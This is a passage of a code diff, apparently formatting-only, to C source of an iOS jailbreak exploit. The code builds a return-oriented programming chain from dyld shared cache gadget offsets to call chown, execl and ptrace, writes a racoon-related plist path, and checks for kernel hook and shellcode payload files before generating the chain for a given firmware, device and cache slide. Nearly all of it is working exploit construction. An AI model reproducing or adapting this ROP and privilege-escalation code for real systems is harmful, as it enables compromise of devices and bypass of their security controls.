+        aShmBaseAddress, 0x0C, dscs + offsets->GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
+    ropStoreValueAtOffsetFromVariableAddress(
+        aShmBaseAddress, 0x1C, dscs + offsets->GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x20, dscs + offsets->_dsc_exit);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + offsets->LIBC_POP_R0123);
-    ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C,
-                                                     aNotifydStringArg2Address);
+    ropStoreVariableValueAtOffsetFromVariableAddress(
+        aShmBaseAddress, 0x2C, aNotifydStringArg2Address);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x30, 0x0);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x34, 0x0);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + offsets->_dsc_chown);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x48, dscs + offsets->LIBC_POP_R0123);
-    ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x4C,
-                                                     aNotifydStringArg0Address);
-    ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x50,
-                                                     aNotifydStringArg0Address);
-    ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x54,
-                                                     aNotifydStringArg1Address);
-    ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x58,
-                                                     aNotifydStringArg2Address);
+    ropStoreVariableValueAtOffsetFromVariableAddress(
+        aShmBaseAddress, 0x4C, aNotifydStringArg0Address);
+    ropStoreVariableValueAtOffsetFromVariableAddress(
+        aShmBaseAddress, 0x50, aNotifydStringArg0Address);
+    ropStoreVariableValueAtOffsetFromVariableAddress(
+        aShmBaseAddress, 0x54, aNotifydStringArg1Address);
+    ropStoreVariableValueAtOffsetFromVariableAddress(
+        aShmBaseAddress, 0x58, aNotifydStringArg2Address);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x5C, dscs + offsets->_dsc_execl);
     ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x60, 0x0);
 
@@ -701,14 +711,15 @@ void exploit()
 
     ropLoadReg0(aRacoonStringArg2Address);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg2Address to PLACE_HOLDER
-    ropCall2(dscs + offsets->_dsc_strcpy, PLACE_HOLDER,
-             newString("/private/var/mobile/Media/corona/jb.plist"));
+    ropCall2(
+        dscs + offsets->_dsc_strcpy, PLACE_HOLDER,
+        newString("/private/var/mobile/Media/corona/jb.plist"));
 
     // ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
     ropLoadReg0(aPid);
     ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
-    ropCall4(dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + offsets->GADGET_HOLY,
-             0);
+    ropCall4(
+        dscs + offsets->_dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + offsets->GADGET_HOLY, 0);
     ropLog("continuing...");
 
     // ropPtrace(PT_DETACH, aPid, 0, 0); // please???
@@ -732,32 +743,26 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     int device = -1;
     int firmware = -1;
     int i;
-    for (i = 0; i < MAX_FIRMWARE; ++i)
-    {
-        if (strcmp(firmwareName, firmwares[i]) == 0)
-        {
+    for (i = 0; i < MAX_FIRMWARE; ++i) {
+        if (strcmp(firmwareName, firmwares[i]) == 0) {
             firmware = i;
             break;
         }
     }
 
-    if (firmware == -1)
-    {
+    if (firmware == -1) {
         fprintf(stderr, "Unrecognized firmware: %s", firmwareName);
         return -1;
     }
 
-    for (i = 0; i < MAX_DEVICE; ++i)
-    {
-        if (strcmp(deviceName, devices[i]) == 0)
-        {
+    for (i = 0; i < MAX_DEVICE; ++i) {
+        if (strcmp(deviceName, devices[i]) == 0) {
             device = i;
             break;
         }
     }
 
-    if (device == -1)
-    {
+    if (device == -1) {
         fprintf(stderr, "Unrecognized device: %s", deviceName);
         return -1;
     }
@@ -773,8 +778,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     // check files
     snprintf(fName, sizeof(fName), "%s/sysent_1c50", dPath);
     f = fopen(fName, "rb");
-    if (!f)
-    {
+    if (!f) {
         fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
@@ -782,8 +786,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     snprintf(fName, sizeof(fName), "%s/zfreehooker.bin", dPath);
     f = fopen(fName, "rb");
-    if (!f)
-    {
+    if (!f) {
         fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
@@ -791,8 +794,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     snprintf(fName, sizeof(fName), "%s/zfreehook.bin", dPath);
     f = fopen(fName, "rb");
-    if (!f)
-    {
+    if (!f) {
         fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
@@ -800,8 +802,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     snprintf(fName, sizeof(fName), "%s/shellcode.bin", dPath);
     f = fopen(fName, "rb");
-    if (!f)
-    {
+    if (!f) {
         fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
@@ -809,8 +810,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     snprintf(fName, sizeof(fName), "%s/sb_evaluatehooker.bin", dPath);
     f = fopen(fName, "rb");
-    if (!f)
-    {
+    if (!f) {
         fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
@@ -818,8 +818,7 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
 
     snprintf(fName, sizeof(fName), "%s/sb_evaluatehook.bin", dPath);
     f = fopen(fName, "rb");
-    if (!f)
-    {
+    if (!f) {
         fprintf(stderr, "ERROR: missing file '%s'", fName);
         return -2;
     }
@@ -828,8 +827,13 @@ int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
     return 0;
 }
 
-int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const char* deviceName,
-                 int pid_len, unsigned int slide)
+int generate_rop(
+    FILE* out,
+    int is_bootstrap,
+    const char* firmwareName,
+    const char* deviceName,
+    int pid_len,
+    unsigned int slide)
 {
     outFile = out;
 
@@ -855,32 +859,26 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
     int device = -1;
     int firmware = -1;
     int i;
-    for (i = 0; i < MAX_FIRMWARE; ++i)
-    {
-        if (strcmp(firmwareName, firmwares[i]) == 0)
-        {
+    for (i = 0; i < MAX_FIRMWARE; ++i) {
+        if (strcmp(firmwareName, firmwares[i]) == 0) {
             firmware = i;
             break;
         }
     }
 
-    if (firmware == -1)
-    {
+    if (firmware == -1) {
         fprintf(stderr, "Unrecognized firmware: %s", firmwareName);
         return -1;
     }
 
-    for (i = 0; i < MAX_DEVICE; ++i)
-    {
-        if (strcmp(deviceName, devices[i]) == 0)
-        {
+    for (i = 0; i < MAX_DEVICE; ++i) {
+        if (strcmp(deviceName, devices[i]) == 0) {
             device = i;
             break;
         }
     }
 
-    if (device == -1)
-    {
+    if (device == -1) {
         fprintf(stderr, "Unrecognized device: %s", deviceName);
         return -1;
     }
@@ -914,12 +912,12 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
 #ifdef FSGEN_MAIN
 int main(int argc, char* argv[])
 {
-    if (argc < 6)
-    {
-        fprintf(stderr,
-                "syntax: %s <is_bootstrap, 0|1> <firmware> <device> <pid length> <dyld shared "
-                "cache slide, ex: 0x40000>",
-                argv[0]);
+    if (argc < 6) {
+        fprintf(
+            stderr,
+            "syntax: %s <is_bootstrap, 0|1> <firmware> <device> <pid length> <dyld shared "
+            "cache slide, ex: 0x40000>",
+            argv[0]);
         exit(1);
     }
 
